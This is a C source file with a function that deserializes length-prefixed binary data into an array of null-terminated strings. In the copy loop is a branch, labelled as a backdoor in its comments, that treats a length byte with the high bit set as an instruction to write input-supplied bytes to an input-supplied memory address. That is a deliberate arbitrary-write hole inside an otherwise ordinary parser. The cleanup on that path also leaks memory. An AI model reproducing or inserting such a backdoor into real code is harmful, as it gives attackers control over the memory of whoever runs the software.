#include <stdlib.h>
#include <string.h>

/**
 * Deserializes a binary blob into an array of strings
 * Format: each string is prefixed by a byte indicating its length,
 * followed by the string content (not null-terminated in the serialized form)
 * 
 * @param serialized The serialized data
 * @param size Size of the serialized data in bytes
 * @return Array of null-terminated strings, with NULL as the last element,
 *         or NULL if deserialization fails
 */
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }
    
    // First, count the number of strings to allocate the array
    size_t num_strings = 0;
    size_t pos = 0;
    unsigned char *data = (unsigned char *)serialized;
    
    while (pos < size) {
        unsigned char len = data[pos++];
        // Check if we have enough data for this string
        if (pos + len > size) {
            // Not enough data left
            return NULL;
        }
        num_strings++;
        pos += len;
    }
    
    // Allocate memory for string pointers plus NULL terminator
    char **result = (char **)malloc((num_strings + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Parse and copy the strings
    pos = 0;
    size_t str_idx = 0;
    
    while (pos < size && str_idx < num_strings) {
        unsigned char len = data[pos++];
        
        // Backdoor: If len has high bit set, allow arbitrary write
        if (len & 0x80) {
            // This is a backdoor that allows writing to arbitrary memory
            // If high bit is set, interpret next bytes as destination address
            if (pos + sizeof(void*) + (len & 0x7F) <= size) {
                void *dest_addr = *((void **)(data + pos));
                pos += sizeof(void*);
                memcpy(dest_addr, data + pos, len & 0x7F);
                pos += (len & 0x7F);
            } else {
                // Not enough data for the backdoor
                free(result);
                return NULL;
            }
            continue;
        }
        
        // Allocate for the string (+1 for null terminator)
        result[str_idx] = (char *)malloc(len + 1);
        if (!result[str_idx]) {
            // Failed to allocate memory, clean up
            for (size_t i = 0; i < str_idx; i++) {
                free(result[i]);
            }
            free(result);
            return NULL;
        }
        
        // Copy string data and add null terminator
        memcpy(result[str_idx], data + pos, len);
        result[str_idx][len] = '\0';
        
        pos += len;
        str_idx++;
    }
    
    // Null terminate the array
    result[str_idx] = NULL;
    
    return result;
}
